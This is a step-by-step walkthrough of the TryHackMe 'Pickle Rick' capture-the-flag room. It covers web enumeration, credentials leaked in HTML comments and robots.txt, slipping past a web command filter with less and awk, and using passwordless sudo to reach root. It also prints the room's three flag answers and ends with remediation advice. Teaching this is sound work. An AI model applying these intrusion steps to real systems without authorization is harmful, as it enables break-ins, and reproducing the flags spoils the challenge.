# TryHackMe — Pickle Rick

### Challenge Link: https://tryhackme.com/room/picklerick

A step-by-step walkthrough for solving the Rick and Morty-themed CTF challenge on TryHackMe.

## Table of Contents

- [1. Challenge Overview](#1-challenge-overview)
- [2. Lab Setup](#2-lab-setup)
- [3. Network Reconnaissance](#3-network-reconnaissance)
- [4. Web Application Enumeration](#4-web-application-enumeration)
- [5. Credential Discovery](#5-credential-discovery)
- [6. Authentication and Command Execution](#6-authentication-and-command-execution)
- [7. Retrieving the First Ingredient](#7-retrieving-the-first-ingredient)
- [8. Retrieving the Second Ingredient](#8-retrieving-the-second-ingredient)
- [9. Privilege Escalation Assessment](#9-privilege-escalation-assessment)
- [10. Retrieving the Third Ingredient](#10-retrieving-the-third-ingredient)
- [11. Final Results](#11-final-results)
- [12. Security Findings](#12-security-findings)
- [13. Remediation Recommendations](#13-remediation-recommendations)

## 1. Challenge Overview

**Platform:** TryHackMe  
**Challenge:** Pickle Rick  
**Category:** Web Application Security and Linux Privilege Escalation  
**Target IP:** `<TARGET-IP>`  
**Attacker Machine:** Kali Linux

### Objective

The goal is to investigate the target web server, discover authentication credentials, gain access to its command interface, and retrieve three ingredients stored on the Linux filesystem.

The challenge demonstrates web enumeration, information disclosure, command execution, Linux file permissions, and insecure privilege delegation.

> Perform these activities only against the authorized TryHackMe target.

## 2. Lab Setup

1. Start the Pickle Rick room on TryHackMe.
2. Deploy the target machine.
3. Confirm the assigned target IP address.
4. Open a terminal on Kali Linux.
5. Ensure the target is reachable before beginning enumeration.

Set a shell variable for convenience:

```bash
export TARGET=<TARGET-IP>
```

Create a working directory to preserve evidence:

```bash
mkdir -p ~/tryhackme/pickle-rick
cd ~/tryhackme/pickle-rick
```

## 3. Network Reconnaissance

### Step 1: Scan the target

Run Nmap with default scripts and service-version detection:

```bash
nmap -sC -sV -oN nmap.txt "$TARGET"
```

### Observed results

| Port | Service | Version |
|---|---|---|
| 22/tcp | SSH | OpenSSH 8.2p1 |
| 80/tcp | HTTP | Apache 2.4.41 |

The HTTP service is the primary starting point because it hosts the challenge application. SSH may become relevant if valid credentials and a suitable access path are discovered.

The HTTP page title is:

```text
Rick is sup4r cool
```

**Finding:** The target exposes a web application on port 80.

## 4. Web Application Enumeration

### Step 2: Inspect the homepage

Open the application in a browser:

```text
http://<TARGET-IP>/
```

Retrieve the HTML source from the terminal:

```bash
curl -s "http://$TARGET/" -o index.html
```

Inspect the saved file:

```bash
less index.html
```

The HTML contains a comment with a username clue:

```html
<!--
  Note to self, remember username!

  Username: R1ckRul3s
-->
```

**Finding:** The username `R1ckRul3s` is exposed in the homepage source.

This demonstrates why developers should avoid leaving sensitive information in client-accessible HTML comments.

### Step 3: Inspect `robots.txt`

Request the file:

```bash
curl -i "http://$TARGET/robots.txt"
```

The response contains:

```text
Wubbalubbadubdub
```

This value is a candidate password clue.

**Finding:** A publicly accessible text file discloses potentially sensitive authentication information.

### Step 4: Enumerate directories and files

Run Gobuster:

```bash
gobuster dir \
  -u "http://$TARGET" \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html \
  -o gobuster.txt
```

Relevant discovered endpoints include:

| Path | Response | Interpretation |
|---|---|---|
| `/index.html` | 200 | Homepage |
| `/login.php` | 200 | Login interface |
| `/portal.php` | 302 | Redirects to the login page |
| `/denied.php` | 302 | Redirects to the login page |
| `/robots.txt` | 200 | Publicly accessible clue |
| `/assets/` | 301 | Static resources |

The `302` responses from `portal.php` and `denied.php` indicate redirects. In this case, the portal redirects unauthenticated visitors to the login page.

## 5. Credential Discovery

### Step 5: Review the discovered clues

The homepage and `robots.txt` provide the following candidates:

| Field | Discovered value |
|---|---|
| Username | `R1ckRul3s` |
| Password candidate | `Wubbalubbadubdub` |

These values were tested through the application's normal login interface.

**Result:** Authentication succeeded.

This demonstrates how information disclosure can undermine authentication when exposed clues reveal valid credentials.

## 6. Authentication and Command Execution

### Step 6: Log in to the application

Navigate to:

```text
http://<TARGET-IP>/login.php
```

Enter the discovered username and password into the login form.

After successful authentication, open the portal:

```text
http://<TARGET-IP>/portal.php
```

The portal provides a command interface that executes commands on the target.

### Step 7: Determine the execution context

Execute:

```bash
whoami
```

Observed output:

```text
www-data
```

Next:

```bash
pwd
```

Observed output:

```text
/var/www/html
```

List the current directory:

```bash
ls -la
```

Relevant files include:

```text
Sup3rS3cretPickl3Ingred.txt
clue.txt
login.php
portal.php
```

**Finding:** The web application's command interface executes operating-system commands as `www-data`, the web-server account.

This represents a serious security risk because successful command execution can expose application files and potentially lead to full system compromise.

### Step 8: Understand command filtering

Attempt to read the first ingredient file:

```bash
cat Sup3rS3cretPickl3Ingred.txt
```

The portal returns a message indicating that the command is disabled.

Alternative commands were tested:

```bash
less Sup3rS3cretPickl3Ingred.txt
```

```bash
awk '{print}' Sup3rS3cretPickl3Ingred.txt
```

Both alternatives successfully displayed the file's contents.

This indicates that the application restricts certain commands but permits other utilities capable of reading files. Such filtering is not an effective security boundary.

## 7. Retrieving the First Ingredient

### Step 9: Read the ingredient file

The file is located at:

```text
/var/www/html/Sup3rS3cretPickl3Ingred.txt
```

Command used:

```bash
less Sup3rS3cretPickl3Ingred.txt
```

**First ingredient:**

```text
mr. meeseek hair
```

The `awk` command also successfully displayed the contents:

```bash
awk '{print}' Sup3rS3cretPickl3Ingred.txt
```

## 8. Retrieving the Second Ingredient

### Step 10: Read the clue file

Execute:

```bash
less clue.txt
```

The file contains the instruction:

```text
Look around the file system for the other ingredient.
```

This indicates that further filesystem enumeration is necessary.

### Step 11: Inspect Rick's home directory

List the directory:

```bash
ls -la /home/rick
```

The output reveals a file named:

```text
second ingredients
```

Because the filename contains a space, enclose its path in quotation marks when accessing it.

Run:

```bash
less "/home/rick/second ingredients"
```

**Second ingredient:**

```text
1 jerry tear
```

This phase demonstrates the importance of inspecting home directories and handling filenames that contain spaces.

## 9. Privilege Escalation Assessment

### Step 12: Enumerate the filesystem

List the root directory:

```bash
ls -la /
```

The directory listing includes `/root`, which normally contains files accessible only to the root user.

Inspect the Ubuntu home directory:

```bash
ls -la /home/ubuntu
```

The directory contains user-specific files, including shell history and SSH configuration. Their restrictive permissions prevent ordinary users from reading them.

### Step 13: Check sudo permissions

Execute:

```bash
sudo -l
```

The target returns:

```text
User www-data may run the following commands on ip-10-49-131-103:
    (ALL) NOPASSWD: ALL
```

This is the critical privilege-escalation finding.

The configuration permits `www-data` to execute commands as other users, including root, without supplying a password.

### Step 14: Verify elevated access

Execute:

```bash
sudo whoami
```

Expected output:

```text
root
```

**Finding:** The web-server account has unrestricted passwordless sudo privileges.

This means the command-execution weakness in the web application can lead directly to root-level access on the target.

## 10. Retrieving the Third Ingredient

### Step 15: Inspect the root directory

Using the elevated privileges, list the contents of `/root`:

```bash
sudo ls -la /root
```

The output reveals:

```text
3rd.txt
```

### Step 16: Read the final ingredient

Execute:

```bash
sudo less /root/3rd.txt
```

The file contains:

```text
3rd ingredients: fleeb juice
```

**Third ingredient:**

```text
fleeb juice
```

The final ingredient is stored in a root-owned file and becomes accessible because of the unrestricted sudo configuration.

## 11. Final Results

All three ingredients have been successfully recovered.

| No. | Ingredient | File Location |
|---|---|---|
| 1 | `mr. meeseek hair` | `/var/www/html/Sup3rS3cretPickl3Ingred.txt` |
| 2 | `1 jerry tear` | `/home/rick/second ingredients` |
| 3 | `fleeb juice` | `/root/3rd.txt` |

Return to the TryHackMe room and submit the recovered values where requested. Confirm that all objectives are marked complete.

## 12. Security Findings

### Finding 1: Information Disclosure

**Evidence:** The homepage source contains a username, and `robots.txt` contains a password clue.

**Impact:** Publicly exposed information can help an attacker authenticate to the application.

**Severity:** Context-dependent; potentially high when the disclosed information enables access.

### Finding 2: Command Execution Through the Web Application

**Evidence:** The authenticated portal executes Linux commands as `www-data`.

**Impact:** An attacker who gains access to this functionality can inspect files and execute commands with the web-server account's privileges.

**Severity:** High to critical, depending on the accessible functionality and system permissions.

### Finding 3: Inadequate Command Filtering

**Evidence:** The `cat` command is blocked, but `less` and `awk` can still read the protected ingredient file.

**Impact:** Command-name filtering does not prevent equivalent operations through alternative utilities.

**Severity:** High when command execution is exposed to an attacker.

### Finding 4: Unrestricted Passwordless Sudo

**Evidence:**

```text
(ALL) NOPASSWD: ALL
```

**Impact:** The web-server account can execute arbitrary commands as root without a password. This turns web application command execution into full system compromise.

**Severity:** Critical.

## 13. Remediation Recommendations

1. **Remove command execution from the web application.** Avoid passing user-controlled input to an operating-system shell. Where functionality requires external processes, use narrowly defined operations and safe argument handling.

2. **Remove unnecessary sudo privileges.** The `www-data` account should not have unrestricted passwordless sudo access. Grant only narrowly scoped privileges when absolutely necessary.

3. **Protect credentials and sensitive clues.** Do not place usernames, passwords, tokens, or other secrets in HTML comments or public text files.

4. **Enforce least privilege.** Ensure that the web-server account can access only the files and resources required by the application.

5. **Use server-side authorization checks.** Restrict administrative pages and command functionality to explicitly authorized users.

6. **Improve command filtering and validation.** Do not rely on blocking individual command names. Prefer eliminating shell access entirely or implementing a constrained allowlist of supported operations.

7. **Monitor suspicious activity.** Log authentication failures, unusual command execution, and privilege-escalation attempts. Protect the logs against unauthorized modification.

8. **Validate the remediation.** Repeat the relevant tests after changes to confirm that public information no longer exposes credentials, command execution is restricted, and the web-server account cannot obtain unnecessary elevated privileges.

## Conclusion

The Pickle Rick challenge demonstrates how multiple weaknesses can combine into a complete compromise.

The investigation began with network reconnaissance, followed by web application enumeration and credential discovery. Authentication provided access to a command interface, which executed commands as `www-data`. Filesystem enumeration revealed the first two ingredients, while unrestricted passwordless sudo enabled access to the root-owned file containing the final ingredient.

The principal security lesson is that **command execution under a low-privilege account can still become a full system compromise when privilege boundaries are misconfigured**.

The challenge was completed by retrieving all three ingredients and identifying the security weaknesses responsible for the compromise.